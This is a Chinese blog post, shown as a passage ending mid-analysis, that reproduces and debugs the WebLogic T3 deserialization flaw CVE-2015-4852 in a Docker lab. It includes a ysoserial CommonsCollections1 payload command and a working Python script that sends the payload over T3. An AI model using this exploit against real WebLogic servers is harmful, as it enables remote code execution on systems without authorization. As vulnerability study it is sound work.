<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="本文已投稿雷神众测公众号：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;iyhfeWofVoq0VBQ35vGUCQ 0x00 前言15年由FoxGlove团队爆出的Java反序列化漏洞，让weblogic、Websphere、Jenkins等都纷纷中招，本文以WebLogic漏洞来进行探索，也算是老生常谈。虽然网上有一些分析CVE-2015-4852的文章，但是有很多地方对于我这样的小白">
<meta property="og:type" content="article">
<meta property="og:title" content="WebLogic系列漏洞学习之T3：CVE-2015-4852">
<meta property="og:url" content="http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/index.html">
<meta property="og:site_name" content="R17a&#39;s blog">
<meta property="og:description" content="本文已投稿雷神众测公众号：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;iyhfeWofVoq0VBQ35vGUCQ 0x00 前言15年由FoxGlove团队爆出的Java反序列化漏洞，让weblogic、Websphere、Jenkins等都纷纷中招，本文以WebLogic漏洞来进行探索，也算是老生常谈。虽然网上有一些分析CVE-2015-4852的文章，但是有很多地方对于我这样的小白">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200722160553546.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200722164315987.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200722170913658.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200722171057111.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200722171319833.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200722234401540.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723000811203.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723004828247.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723102516480.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723010242010.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723011015134.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723011309520.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723011634515.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723011954330.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723012246853.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723012342993.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723012632169.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723110516481.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723111744197.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723153407271.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723161034461.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723163029568.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723164920876.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723165303093.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723165816296.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723170135374.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723170853261.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723171216583.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723171646692.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723171927667.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723172637138.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723174345127.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723183948828.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723193140849.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200723194727483.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727142144289.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200722194206028.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727145037589.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200728102258009.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727145114068.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727111550828.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727144619522.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727145122952.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727172157127.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727185743443.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200728111018511.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727203858505.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727195322478.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727211240947.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200728105558850.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727210203651.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727204747709.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727213721378.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200727231807422.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200728145807642.png">
<meta property="og:image" content="http://yoursite.com/imgs/image-20200728165240568.png">
<meta property="article:published_time" content="2020-07-29T12:33:27.000Z">
<meta property="article:modified_time" content="2020-08-31T07:40:27.000Z">
<meta property="article:author" content="R17a">
<meta property="article:tag" content="WebLogic">
<meta property="article:tag" content="CVE-2015-4852">
<meta property="article:tag" content="T3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/imgs/image-20200722160553546.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>WebLogic系列漏洞学习之T3：CVE-2015-4852</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&text=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&is_video=false&description=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebLogic系列漏洞学习之T3：CVE-2015-4852&body=Check out this article: http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&title=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&name=WebLogic系列漏洞学习之T3：CVE-2015-4852&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/&t=WebLogic系列漏洞学习之T3：CVE-2015-4852" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-复现"><span class="toc-number">2.</span> <span class="toc-text">0x01 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现"><span class="toc-number">2.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-深入分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 深入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#远程调试"><span class="toc-number">3.1.</span> <span class="toc-text">远程调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic源码分析"><span class="toc-number">3.2.</span> <span class="toc-text">Weblogic源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections1分析"><span class="toc-number">3.3.</span> <span class="toc-text">CommonsCollections1分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析第一部分"><span class="toc-number">3.3.1.</span> <span class="toc-text">分析第一部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析第二部分"><span class="toc-number">3.3.2.</span> <span class="toc-text">分析第二部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析第三部分"><span class="toc-number">3.3.3.</span> <span class="toc-text">分析第三部分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-思考和启发"><span class="toc-number">4.</span> <span class="toc-text">0x03 思考和启发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考链接："><span class="toc-number">5.</span> <span class="toc-text">0x04 参考链接：</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        WebLogic系列漏洞学习之T3：CVE-2015-4852
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">R17a</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-07-29T12:33:27.000Z" itemprop="datePublished">2020-07-29</time>
        
        (Updated: <time datetime="2020-08-31T07:40:27.000Z" itemprop="dateModified">2020-08-31</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/WebLogic/">WebLogic</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/WebLogic/T3/">T3</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CVE-2015-4852/" rel="tag">CVE-2015-4852</a>, <a class="tag-link" href="/tags/T3/" rel="tag">T3</a>, <a class="tag-link" href="/tags/WebLogic/" rel="tag">WebLogic</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>本文已投稿雷神众测公众号：<a href="https://mp.weixin.qq.com/s/iyhfeWofVoq0VBQ35vGUCQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/iyhfeWofVoq0VBQ35vGUCQ</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>15年由<a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#commons" target="_blank" rel="noopener">FoxGlove</a>团队爆出的Java反序列化漏洞，让weblogic、Websphere、Jenkins等都纷纷中招，本文以WebLogic漏洞来进行探索，也算是老生常谈。虽然网上有一些分析CVE-2015-4852的文章，但是有很多地方对于我这样的小白不太能理解，还有很多直接对CommonsCollections分析的，不能解答我的困惑。在开始分析前，先记录下，有两个问题需要我探索。</p>
<ol>
<li>为什么CommonsCollections能在WebLogic中经过T3自动引发？<strong>在收到数据后Weblogic到底怎么操作然后调用CommonsCollections的</strong>？</li>
<li>为什么CommonsCollections<strong>能够引起命令执行</strong>，需要什么条件？有哪些类是类似的？</li>
</ol>
<p>文笔粗糙，如有不当，请各位师傅批评指正。</p>
<h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境：centos7.3； docker + docker-compose</p>
<ul>
<li>vim Dockerfile</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/weblogic</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> debugFlag true</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">7001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8453</span></span><br></pre></td></tr></table></figure>

<ul>
<li>vim docker-compose.yml</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">"7001:7001"</span></span><br><span class="line">      - <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure>

<ul>
<li>docker-compose up -d</li>
<li>本地访问192.168.132:7001</li>
</ul>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>先生成反序列化文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections1 <span class="string">"touch /tmp/success"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>用之前学习T3时的<a href="/2020/07/22/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/">脚本</a>发送恶意数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(ip, port, file)</span>:</span></span><br><span class="line">    t3_header = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span></span><br><span class="line">    host = (ip, int(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">'016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">'%s%s'</span> % (<span class="string">'&#123;:08x&#125;'</span>.format(len(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp(<span class="string">'192.168.116.132'</span>,<span class="string">'7001'</span>,<span class="string">'E:\poc.ser'</span>)</span><br></pre></td></tr></table></figure>

<p>进入容器，验证是否执行成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 363 bash</span><br><span class="line">ls /tmp</span><br></pre></td></tr></table></figure>

<p>成功创建success文件</p>
<p><img src="/imgs/image-20200722160553546.png" alt="image-20200722160553546"></p>
<h2 id="0x02-深入分析"><a href="#0x02-深入分析" class="headerlink" title="0x02 深入分析"></a>0x02 深入分析</h2><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><p>搭建环境复现的时候我们已经对容器开去了远程调试服务，下面只需要对本地IDEA环境进行部署。</p>
<p>首先从容器拷贝root目录，然后单独将相关的jar包拷贝出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp 363:/root .</span><br><span class="line">mkdir jar_lib</span><br><span class="line">find ./ -name *.jar -<span class="built_in">exec</span> cp &#123;&#125; jar_lib/ \;</span><br></pre></td></tr></table></figure>

<p>将上述jar_lib和root放到本地，然后用IDEA打开root/Oracle/Middleware/wlserver_10.3，将jar_lib加入libraries</p>
<p><img src="/imgs/image-20200722164315987.png" alt="image-20200722164315987"></p>
<p>选择weblogic自带的jdk root/jdk/jdk1.6.0_45</p>
<p><img src="/imgs/image-20200722170913658.png" alt="image-20200722170913658"></p>
<p>添加远程JVM</p>
<p><img src="/imgs/image-20200722171057111.png" alt="image-20200722171057111"></p>
<p>然后debug，出现下图说明连接上了远程JVM</p>
<p><img src="/imgs/image-20200722171319833.png" alt="image-20200722171319833"></p>
<h3 id="Weblogic源码分析"><a href="#Weblogic源码分析" class="headerlink" title="Weblogic源码分析"></a>Weblogic源码分析</h3><p>ok，到这里我们万事俱备，只差Debug的入口，从哪里入口是一个难题。</p>
<p>首先我考虑的是T3相关的jar，那肯定T3相关的处理能拦截到，但是在weblogic.jar下面找了几个T3的试了下都不成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weblogic.common.T3Connection <span class="comment">#不能拦截</span></span><br><span class="line">weblogic.common.T3Client <span class="comment">#不能拦截</span></span><br><span class="line">weblogic.rjvm.t3.ProtocolHandlerT3 <span class="comment">#能拦截，但是只要发送包就会拦截，发送协议头就被拦截了，不符合要求</span></span><br></pre></td></tr></table></figure>

<p>然后在我有点绝望的时候，在<a href="https://blog.csdn.net/simonnews/article/details/105765017" target="_blank" rel="noopener">Weblogic漏洞Java反序列化CVE-2015-4852解析</a>博客中发现有说明漏洞的补丁情况</p>
<p><img src="/imgs/image-20200722234401540.png" alt="image-20200722234401540"></p>
<p>所以就想我为什么不能在这些地方打断点分析呢？通过快捷键（双击shift）查找，找到了这些类的位置如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev</span><br><span class="line">wlthint3client.jar:weblogic.rjvm.MsgAbbrevInputStream</span><br><span class="line">weblogic.jar:weblogic.iiop.Utils</span><br></pre></td></tr></table></figure>

<p>在wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev:23行这里打断点试试，然后执行脚本，成功拦截</p>
<p><img src="/imgs/image-20200723000811203.png" alt="image-20200723000811203"></p>
<p>参数var1.head可以看到是我们发送的包含了反序列化数据的包，InboundMsgAbbrev#read()应该是处理从客户端接收到的数据进行读取</p>
<p><img src="/imgs/image-20200723004828247.png" alt="image-20200723004828247"></p>
<p>往下执行到readObject，我们F7进入该方法进行分析</p>
<p><img src="/imgs/image-20200723102516480.png" alt="image-20200723102516480"></p>
<p>执行var1.read，继续F7深入</p>
<p><img src="/imgs/image-20200723010242010.png" alt="image-20200723010242010"></p>
<p>进入到readObject()，往下执行var2=0进入case 0，return (new InboundMsgAbbrev.ServerChannelInputStream(var1)).readObject();</p>
<p>我们先分析new InboundMsgAbbrev.ServerChannelInputStream(var1)</p>
<p><img src="/imgs/image-20200723011015134.png" alt="image-20200723011015134"></p>
<p>进入后，继续深入getServerChannel()</p>
<p><img src="/imgs/image-20200723011309520.png" alt="image-20200723011309520"></p>
<p>然后进入到weblogic.rjvm.MsgAbbrevInputStream#getServerChannel()，这个类就是我们刚刚看到的打补丁的第二个地方</p>
<p><img src="/imgs/image-20200723011634515.png" alt="image-20200723011634515"></p>
<p>继续深入getChannel看看，这次不是在同一个jar了，进入到了 weblogic.jar:weblogic.rjvm.t3.MuxableSocketT3.T3MsgAbbrevJVMConnection#getChannel()，这里是刚开始找debug入口时看到的类，处理T3协议的socket</p>
<p><img src="/imgs/image-20200723011954330.png" alt="image-20200723011954330"></p>
<p>继续深入进入weblogic.socket.BaseAbstractMuxableSocket（BaseAbstractMuxableSocket implements MuxableSocket, SocketRuntime, ContextHandler, Serializable）</p>
<p><img src="/imgs/image-20200723012246853.png" alt="image-20200723012246853"></p>
<p>返回了channel，这个时候看到了(“AS:” + MsgAbbrevJVMConnection.ABBREV_TABLE_SIZE + “\n” + “HL” + “:” + 19 + “\n\n”)跟之前学习T3的包联系上了</p>
<p><img src="/imgs/image-20200723012342993.png" alt="image-20200723012342993"></p>
<p>继续执行，一步步返回到了最初的位置，这个时候完成了ServerChannelInputStream的实例，其实到这里我们可以看出经过这几个步骤，能够对传入的socket进行T3的处理，获取到信息流。接下来调用readObject，我们需要认真分析下这个</p>
<p><img src="/imgs/image-20200723012632169.png" alt="image-20200723012632169"></p>
<p>进入ChunkedObjectInputStream#read(),curEndEnvelop=-1，调用super.read()，F7进入read()</p>
<p><img src="/imgs/image-20200723110516481.png" alt="image-20200723110516481"></p>
<p>进入到了ChunkedInputStream#read()，该方法主要是读取head数据也就是我们发送的包</p>
<p><img src="/imgs/image-20200723111744197.png" alt="image-20200723111744197"></p>
<p>继续返回ChunkedObjectInputStream#read()，会继续调用ChunkedObjectInputStream#read(var1,var2,var3)以及ChunkedInputStream#read(var1,var2,var3)，往后执行，发现这几个方法是对数据流进行分块处理，按照<code>7870</code>即xp将序列化部分分块，依次解析每块的类，然后去执行</p>
<p><img src="/imgs/image-20200723153407271.png" alt="image-20200723153407271"></p>
<p>以下为分析过程中记录的每个分块的类的通过<strong>resolveClass()</strong>方法进行的解析</p>
<p>chunkedpos从109-239，sun.reflect.annotation.AnnotationInvocationHandler</p>
<p><img src="/imgs/image-20200723161034461.png" alt="image-20200723161034461"></p>
<p>chunkedpos从239-393，org.apache.commons.collections.map.TransformedMap</p>
<p><img src="/imgs/image-20200723163029568.png" alt="image-20200723163029568"></p>
<p>chunkedpos从239-533，org.apache.commons.collections.functors.ChainedTransformer</p>
